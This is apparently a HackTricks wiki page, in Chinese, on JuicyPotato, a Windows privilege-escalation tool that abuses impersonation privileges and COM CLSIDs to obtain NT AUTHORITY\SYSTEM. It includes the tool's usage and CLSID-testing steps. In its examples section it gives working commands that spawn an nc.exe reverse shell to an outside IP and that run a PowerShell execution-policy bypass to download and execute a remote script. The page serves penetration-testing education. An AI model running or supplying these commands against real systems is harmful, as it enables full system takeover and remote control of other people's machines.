# JuicyPotato

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

{% hint style="warning" %}
**JuicyPotato 在** Windows Server 2019 和 Windows 10 build 1809 及之后版本上**无法工作**。然而， [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) 可以用来 **利用相同的权限并获得 `NT AUTHORITY\SYSTEM`** 级别的访问权限。 _**检查：**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (滥用黄金权限) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_一个经过糖化的_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG) _版本，带有一点“果汁”，即 **另一个本地权限提升工具，从 Windows 服务账户到 NT AUTHORITY\SYSTEM**_

#### 你可以从 [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) 下载 juicypotato

### 摘要 <a href="#summary" id="summary"></a>

[**来自 juicy-potato 的自述文件**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) 及其 [变种](https://github.com/decoder-it/lonelypotato) 利用基于 [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [服务](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) 的权限提升链，具有在 `127.0.0.1:6666` 上的 MiTM 监听器，并且当你拥有 `SeImpersonate` 或 `SeAssignPrimaryToken` 权限时。在一次 Windows 构建审查中，我们发现了一个故意禁用 `BITS` 的设置，并且端口 `6666` 被占用。

我们决定武器化 [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)：**向 Juicy Potato 打个招呼**。

> 有关理论，请参见 [Rotten Potato - 从服务账户到 SYSTEM 的权限提升](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) 并跟踪链接和参考。

我们发现，除了 `BITS` 之外，还有几个 COM 服务器可以利用。它们只需要：

1. 由当前用户实例化，通常是具有模拟权限的“服务用户”
2. 实现 `IMarshal` 接口
3. 以提升的用户身份运行（SYSTEM、Administrator 等）

经过一些测试，我们获得并测试了一份在多个 Windows 版本上的 [有趣 CLSID 列表](http://ohpe.it/juicy-potato/CLSID/)。

### Juicy 细节 <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato 允许你：

* **目标 CLSID** _选择你想要的任何 CLSID。_ [_这里_](http://ohpe.it/juicy-potato/CLSID/) _你可以找到按操作系统组织的列表。_
* **COM 监听端口** _定义你喜欢的 COM 监听端口（而不是硬编码的 6666）_
* **COM 监听 IP 地址** _在任何 IP 上绑定服务器_
* **进程创建模式** _根据模拟用户的权限，你可以选择：_
* `CreateProcessWithToken`（需要 `SeImpersonate`）
* `CreateProcessAsUser`（需要 `SeAssignPrimaryToken`）
* `两者都可以`
* **要启动的进程** _如果利用成功，启动一个可执行文件或脚本_
* **进程参数** _自定义启动进程的参数_
* **RPC 服务器地址** _为了隐蔽的方式，你可以认证到外部 RPC 服务器_
* **RPC 服务器端口** _如果你想认证到外部服务器而防火墙阻止端口 `135`，这很有用…_
* **测试模式** _主要用于测试目的，即测试 CLSID。它创建 DCOM 并打印令牌的用户。请参见_ [_这里进行测试_](http://ohpe.it/juicy-potato/Test/)

### 使用 <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 最后想法 <a href="#final-thoughts" id="final-thoughts"></a>

[**来自 juicy-potato 读我**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

如果用户拥有 `SeImpersonate` 或 `SeAssignPrimaryToken` 权限，那么你就是 **SYSTEM**。

几乎不可能防止所有这些 COM 服务器的滥用。你可以考虑通过 `DCOMCNFG` 修改这些对象的权限，但祝你好运，这将是一个挑战。

实际的解决方案是保护在 `* SERVICE` 账户下运行的敏感账户和应用程序。停止 `DCOM` 无疑会抑制此漏洞，但可能会对底层操作系统产生严重影响。

来自: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## 示例

注意: 访问 [此页面](https://ohpe.it/juicy-potato/CLSID/) 获取可尝试的 CLSID 列表。

### 获取 nc.exe 反向 shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 启动新的 CMD（如果您有 RDP 访问权限）

![](<../../.gitbook/assets/image (300).png>)

## CLSID 问题

通常，JuicyPotato 使用的默认 CLSID **无法工作**，并且漏洞利用失败。通常，需要多次尝试才能找到一个 **有效的 CLSID**。要获取特定操作系统的 CLSID 列表，您应该访问此页面：

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **检查 CLSID**

首先，您需要一些可执行文件，除了 juicypotato.exe。

下载 [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) 并将其加载到您的 PS 会话中，然后下载并执行 [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)。该脚本将创建一个可能的 CLSID 列表以供测试。

然后下载 [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)（更改 CLSID 列表和 juicypotato 可执行文件的路径）并执行它。它将开始尝试每个 CLSID，**当端口号改变时，这意味着 CLSID 有效**。

**使用参数 -c 检查** 有效的 CLSID

## 参考文献

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)


{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
